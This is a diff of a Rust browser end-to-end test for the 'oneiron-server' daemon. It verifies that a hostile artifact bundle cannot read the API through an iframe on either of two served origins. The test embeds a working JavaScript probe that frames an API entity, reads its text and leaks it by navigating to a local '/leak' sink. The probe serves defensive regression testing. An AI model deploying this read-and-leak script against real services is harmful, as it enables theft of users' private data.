@@ -1,13 +1,17 @@
 //! F02 (H103), in a real browser. A hostile code-bundle artifact opened as the
 //! local daemon user frames an API response and sends what it read away by
-//! navigation. A code bundle's own scripts run on the daemon's origin, so
-//! before its document was sandboxed the frame was same-origin and readable.
+//! navigation. On the daemon's origin a bundle's own scripts ran same-origin
+//! with the API, so before its document was sandboxed the frame was readable.
 //! The probe reports `read:` with what it read, `denied:` with the refusal it
 //! observed (a frame-src violation or a cross-origin document), or `timeout`.
+//! It runs on both origins the daemon serves bundles on: the API's, where the
+//! bundle is sandboxed, and the artifact listener's, where it targets the
+//! API's absolute URL.
 //!
 //! A bundle's module scripts and web fonts are fetched in CORS mode, so they
-//! need the bundle to keep an origin of its own: the second probe reports
-//! `module:ok` once its module graph ran, with whether its font loaded.
+//! need the bundle to keep an origin of its own, which the artifact listener
+//! gives it: the second probe reports `module:ok` once its module graph ran,
+//! with whether its font loaded.
 //!
 //! Needs a headless Chrome: set `ONEIRON_E2E_CHROME` to its binary and run
 //! `cargo test -p oneiron-server --test it -- --ignored artifact_origin_browser`.
@@ -18,9 +22,9 @@ use std::sync::{Arc, Mutex};
 use std::time::Duration;
 
 use oneiron::{TimeRange, VaultConfig};
-use oneiron_server::build_app;
 use oneiron_server::config::SyncServerConfig;
 use oneiron_server::server::SyncServer;
+use oneiron_server::{build_app, build_artifact_app};
 
 const PROBE_FONT: &[u8] = include_bytes!("../fixtures/artifact/probe-font.ttf");
 
@@ -112,15 +116,33 @@ fn publish_bundle(vault: &oneiron::Vault, name: &str, files: &[(&str, &[u8])]) {
         .expect("publish bundle");
 }
 
-/// An unauthenticated dev daemon over a fresh vault, which `fill` stocks
-/// before it serves. With no credential the API answers a browser on the
-/// daemon's origin, which is what makes a same-origin read pay.
-async fn spawn_daemon(fill: impl FnOnce(&oneiron::Vault)) -> (SocketAddr, tempfile::TempDir) {
+/// A running unauthenticated dev daemon: the API's address, the artifact
+/// listener's, and the vault directory they serve.
+struct Daemon {
+    api: SocketAddr,
+    artifacts: SocketAddr,
+    _vault_dir: tempfile::TempDir,
+}
+
+/// Serves a fresh vault on two listeners, as ordinary serve does: the API,
+/// and `/a/` alone on a port of its own. `fill` stocks the vault before
+/// either serves, knowing the API's address. With no credential the API
+/// answers a browser on its own origin, which is what makes a same-origin
+/// read pay.
+async fn spawn_daemon(fill: impl FnOnce(&oneiron::Vault, SocketAddr)) -> Daemon {
+    let api_listener = tokio::net::TcpListener::bind("127.0.0.1:0")
+        .await
+        .expect("bind daemon");
+    let artifact_listener = tokio::net::TcpListener::bind("127.0.0.1:0")
+        .await
+        .expect("bind artifact listener");
+    let api = api_listener.local_addr().expect("daemon addr");
+    let artifacts = artifact_listener.local_addr().expect("artifact addr");
     let vault_dir = tempfile::tempdir().expect("vault dir");
     let mut vault_config = VaultConfig::device();
     vault_config.map_size = 64 * 1024 * 1024;
     let vault = Arc::new(oneiron::Vault::open(vault_dir.path(), vault_config).expect("vault"));
-    fill(&vault);
+    fill(&vault, api);
     let server = Arc::new(
         SyncServer::new(
             vault,
@@ -129,17 +151,24 @@ async fn spawn_daemon(fill: impl FnOnce(&oneiron::Vault)) -> (SocketAddr, tempfi
                 ..Default::default()
             },
         )
-        .expect("server"),
+        .expect("server")
+        .with_artifact_listener(artifacts.port()),
     );
-    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
-        .await
-        .expect("bind daemon");
-    let daemon = listener.local_addr().expect("daemon addr");
+    let artifact_app = build_artifact_app(server.clone());
     let app = build_app(server);
     tokio::spawn(async move {
-        axum::serve(listener, app).await.expect("serve");
+        axum::serve(api_listener, app).await.expect("serve");
     });
-    (daemon, vault_dir)
+    tokio::spawn(async move {
+        axum::serve(artifact_listener, artifact_app)
+            .await
+            .expect("serve artifacts");
+    });
+    Daemon {
+        api,
+        artifacts,
+        _vault_dir: vault_dir,
+    }
 }
 
 /// Opens `url` in a fresh headless Chrome and waits for it to finish.
@@ -173,25 +202,25 @@ async fn open_in_chrome(url: &str) {
 async fn a_code_artifact_cannot_read_the_api_through_a_frame_and_send_it_away() {
     let (sink_port, sink) = spawn_sink();
 
-    // The page frames an API response on its own origin and navigates to the
-    // sink with whatever it could read, or with why it could not.
+    // The page frames an API response by its absolute URL and navigates to
+    // the sink with whatever it could read, or with why it could not.
     let target = oneiron::EntityId::now().to_hex();
-    let probe = format!(
-        "let sent = false;\n\
-         function send(text) {{ if (sent) return; sent = true; \
-         location.href = 'http://127.0.0.1:{sink_port}/leak?d=' + encodeURIComponent(text); }}\n\
-         document.addEventListener('securitypolicyviolation', (event) => {{ \
-         if (event.violatedDirective.startsWith('frame-src')) send('denied:frame-src'); }});\n\
-         const frame = document.createElement('iframe');\n\
-         frame.onload = () => {{ let page; \
-         try {{ page = frame.contentDocument; }} \
-         catch (error) {{ send(error.name === 'SecurityError' ? 'denied:SecurityError' : 'error:' + error.name); return; }} \
-         send(page === null ? 'denied:cross-origin' : 'read:' + page.body.innerText); }};\n\
-         frame.src = '/api/entity/{target}';\n\
-         document.body.appendChild(frame);\n\
-         setTimeout(() => send('timeout'), 5000);\n"
-    );
-    let (daemon, _vault_dir) = spawn_daemon(|vault| {
+    let daemon = spawn_daemon(|vault, api| {
+        let probe = format!(
+            "let sent = false;\n\
+             function send(text) {{ if (sent) return; sent = true; \
+             location.href = 'http://127.0.0.1:{sink_port}/leak?d=' + encodeURIComponent(text); }}\n\
+             document.addEventListener('securitypolicyviolation', (event) => {{ \
+             if (event.violatedDirective.startsWith('frame-src')) send('denied:frame-src'); }});\n\
+             const frame = document.createElement('iframe');\n\
+             frame.onload = () => {{ let page; \
+             try {{ page = frame.contentDocument; }} \
+             catch (error) {{ send(error.name === 'SecurityError' ? 'denied:SecurityError' : 'error:' + error.name); return; }} \
+             send(page === null ? 'denied:cross-origin' : 'read:' + page.body.innerText); }};\n\
+             frame.src = 'http://{api}/api/entity/{target}';\n\
+             document.body.appendChild(frame);\n\
+             setTimeout(() => send('timeout'), 5000);\n"
+        );
         publish_bundle(
             vault,
             "hostile",
@@ -207,21 +236,22 @@ async fn a_code_artifact_cannot_read_the_api_through_a_frame_and_send_it_away() 
     })
     .await;
 
-    open_in_chrome(&format!("http://{daemon}/a/hostile/_s/c/published/")).await;
-
-    let leaks = reports(&sink, "leak");
-    assert_eq!(
-        leaks.len(),
-        1,
-        "the bundle's own script runs and reports once: {leaks:?}"
-    );
-    eprintln!("browser report: {}", leaks[0]);
-    // Only an observed refusal counts: a timeout or a probe error fails.
-    assert!(
-        leaks[0].starts_with("denied"),
-        "the bundle's frame read was not refused: {}",
-        leaks[0]
-    );
+    for (runs, origin) in [(1, daemon.api), (2, daemon.artifacts)] {
+        open_in_chrome(&format!("http://{origin}/a/hostile/_s/c/published/")).await;
+        let leaks = reports(&sink, "leak");
+        assert_eq!(
+            leaks.len(),
+            runs,
+            "the bundle's own script runs and reports once on {origin}: {leaks:?}"
+        );
+        let report = &leaks[runs - 1];
+        eprintln!("browser report on {origin}: {report}");
+        // Only an observed refusal counts: a timeout or a probe error fails.
+        assert!(
+            report.starts_with("denied"),
+            "the bundle's frame read on {origin} was not refused: {report}"
+        );
+    }
 }
 
 /// A bundle whose page loads a stylesheet with an `@font-face`, a classic
@@ -280,10 +310,10 @@ fn module_and_font_bundle(sink_port: u16) -> Vec<(&'static str, Vec<u8>)> {
 
 #[ignore = "requires a headless Chrome named by ONEIRON_E2E_CHROME"]
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
-async fn a_code_bundle_runs_its_module_scripts_and_loads_its_fonts() {
+async fn a_code_bundle_runs_its_module_scripts_and_loads_its_fonts_on_the_artifact_origin() {
     let (sink_port, sink) = spawn_sink();
     let files = module_and_font_bundle(sink_port);
-    let (daemon, _vault_dir) = spawn_daemon(|vault| {
+    let daemon = spawn_daemon(|vault, _| {
         let files: Vec<(&str, &[u8])> = files
             .iter()
             .map(|(path, bytes)| (*path, bytes.as_slice()))
@@ -292,7 +322,11 @@ async fn a_code_bundle_runs_its_module_scripts_and_loads_its_fonts() {
     })
     .await;
 
-    open_in_chrome(&format!("http://{daemon}/a/fonts/_s/c/published/")).await;
+    open_in_chrome(&format!(
+        "http://{}/a/fonts/_s/c/published/",
+        daemon.artifacts
+    ))
+    .await;
 
     let seen = reports(&sink, "report");
     eprintln!("browser report: {seen:?}");
